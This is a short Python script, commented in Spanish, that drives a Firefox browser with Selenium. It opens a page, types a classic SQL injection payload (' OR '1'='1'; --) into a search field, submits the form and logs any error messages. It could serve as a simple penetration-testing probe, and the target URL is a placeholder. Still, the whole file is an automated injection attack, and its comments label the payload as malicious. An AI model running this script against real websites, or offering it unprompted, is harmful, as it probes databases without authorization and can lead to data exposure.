import time
import logging
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException

# Configuración del registro
logging.basicConfig(level=logging.INFO)

def buscar_mensajes_error(driver):
    try:
        return driver.find_elements_by_class_name("mensaje-error")
    except NoSuchElementException:
        return []

def realizar_inyeccion_sql(url, inyeccion_sql):
    # Inicializa el controlador del navegador (en este caso, Firefox)
    driver = webdriver.Firefox()

    try:
        # Abre la página web en el navegador
        driver.get(url)

        # Configura el tiempo de espera implícito (segundos)
        driver.implicitly_wait(10)

        # Encuentra el campo de búsqueda
        campo_busqueda = driver.find_element_by_id("campo_busqueda")

        # Envía la inyección SQL maliciosa
        campo_busqueda.send_keys(inyeccion_sql)

        # Envía el formulario
        campo_busqueda.submit()

        # Espera un breve momento para que la página procese la inyección SQL
        time.sleep(2)

        # Busca mensajes de error en la página
        mensajes_error = buscar_mensajes_error(driver)

        if mensajes_error:
            for mensaje in mensajes_error:
                logging.info(f"Mensaje de error encontrado: {mensaje.text}")
        else:
            logging.info("No se encontraron mensajes de error.")

    except Exception as e:
        logging.error(f"Error durante la ejecución: {str(e)}")

    finally:
        # Cierra el navegador al finalizar
        driver.quit()

# URL de la página a testear
url = "https://www.ejemplo.com"

# Inyección SQL maliciosa
inyeccion_sql = "' OR '1'='1'; --"

# Ejecuta la inyección SQL
realizar_inyeccion_sql(url, inyeccion_sql)
